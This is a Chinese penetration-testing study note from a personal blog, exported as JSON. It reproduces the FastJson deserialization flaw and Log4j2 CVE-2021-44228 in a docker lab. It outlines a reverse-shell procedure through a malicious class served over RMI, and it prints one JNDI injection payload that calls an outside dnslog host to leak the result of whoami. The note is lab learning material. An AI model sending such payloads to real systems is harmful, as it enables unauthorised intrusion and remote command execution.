{"title":"渗透测试笔记 - day50 Web框架漏洞（FastJson、Log4j2）","date":"2023-03-16T17:42:18.161Z","date_formatted":{"ll":"Mar 16, 2023","L":"03/16/2023","MM-DD":"03-16"},"link":"2023/03/16/渗透测试笔记 - day50 Web框架漏洞（FastJson、Log4j2）","updated":"2023-03-17T05:01:17.398Z","content":"<h2 id=\"fastjson反序列化漏洞\">FastJson反序列化漏洞<a title=\"#fastjson反序列化漏洞\" href=\"#fastjson反序列化漏洞\"></a></h2>\n<ul>\n<li>环境：kali2021 / docker / vulhub</li>\n<li>原理：fastjson autotype在处理json对象的时候没有对@type字段进行安全性验证，导致攻击者传入危险类，并调用危险类连接远程主机，通过恶意类执行代码</li>\n<li>影响版本：&lt; 1.2.25</li>\n</ul>\n<h3 id=\"漏洞复现\">漏洞复现<a title=\"#漏洞复现\" href=\"#漏洞复现\"></a></h3>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204101951827.png\" alt=\"image-20220410195109703\" loading=\"lazy\" class=\"φbp\"></p>\n<p>首先构造一个恶意类反弹shell到本机7770端口，编译并上传</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204102053447.png\" alt=\"image-20220410205337421\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204102055584.png\" alt=\"image-20220410205547552\" loading=\"lazy\" class=\"φbp\"></p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204102108917.png\" alt=\"image-20220410210846874\" loading=\"lazy\" class=\"φbp\"></p>\n<p>监听7770端口</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204102110356.png\" alt=\"image-20220410211000322\" loading=\"lazy\" class=\"φbp\"></p>\n<p>开启一个http服务用来加载恶意类</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204102117902.png\" alt=\"image-20220410211702868\" loading=\"lazy\" class=\"φbp\"></p>\n<p>启动rmi服务监听7791端口</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204102120477.png\" alt=\"image-20220410212030450\" loading=\"lazy\" class=\"φbp\"></p>\n<p>构造请求数据包</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204102129114.png\" alt=\"image-20220410212909032\" loading=\"lazy\" class=\"φbp\"></p>\n<p>发送并接受shell</p>\n<p>完成。</p>\n<h2 id=\"log4j2任意命令执行漏洞（cve-2021-44228）\">Log4j2任意命令执行漏洞（CVE-2021-44228）<a title=\"#log4j2任意命令执行漏洞（cve-2021-44228）\" href=\"#log4j2任意命令执行漏洞（cve-2021-44228）\"></a></h2>\n<ul>\n<li>环境：kali2021 / docker / vulhub</li>\n</ul>\n<h3 id=\"漏洞复现-1\">漏洞复现<a title=\"#漏洞复现-1\" href=\"#漏洞复现-1\"></a></h3>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204102032968.png\" alt=\"image-20220410203222776\" loading=\"lazy\" class=\"φbp\"></p>\n<p>申请dnslog地址</p>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204102032647.png\" alt=\"image-20220410203255535\" loading=\"lazy\" class=\"φbp\"></p>\n<p>构造payload并访问</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:whoami&#125;.j5xc7v.dnslog.cn&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://raw.githubusercontent.com/Lq0ne/my_pic/main/202204102035671.png\" alt=\"image-20220410203512610\" loading=\"lazy\" class=\"φbp\"></p>\n<p>完成。</p>\n","prev":{"title":"渗透测试笔记 - day51 获取shell与提权","link":"2023/03/16/渗透测试笔记 - day51 获取shell与提权"},"next":{"title":"渗透测试笔记 - day47 中间件漏洞（JBoss、Strust2）","link":"2023/03/16/渗透测试笔记 - day47 中间件漏洞（JBoss、Strust2）"},"plink":"https://Lq0ne.github.io/2023/03/16/渗透测试笔记 - day50 Web框架漏洞（FastJson、Log4j2）/","toc":[{"id":"fastjson反序列化漏洞","title":"FastJson反序列化漏洞","index":"1","children":[{"id":"漏洞复现","title":"漏洞复现","index":"1.1"}]},{"id":"log4j2任意命令执行漏洞（cve-2021-44228）","title":"Log4j2任意命令执行漏洞（CVE-2021-44228）","index":"2","children":[{"id":"漏洞复现-1","title":"漏洞复现","index":"2.1"}]}],"copyright":{"license":"个人原创 - 自由转载 - 保持署名 - 禁止商用","published":"March 16, 2023","author":"Lq0ne","link":"<a href=\"https://Lq0ne.github.io/2023/03/16/渗透测试笔记 - day50 Web框架漏洞（FastJson、Log4j2）/\" title=\"渗透测试笔记 - day50 Web框架漏洞（FastJson、Log4j2）\">https://Lq0ne.github.io/2023/03/16/渗透测试笔记 - day50 Web框架漏洞（FastJson、Log4j2）/</a>"},"reading_time":"314 words in 2 min"}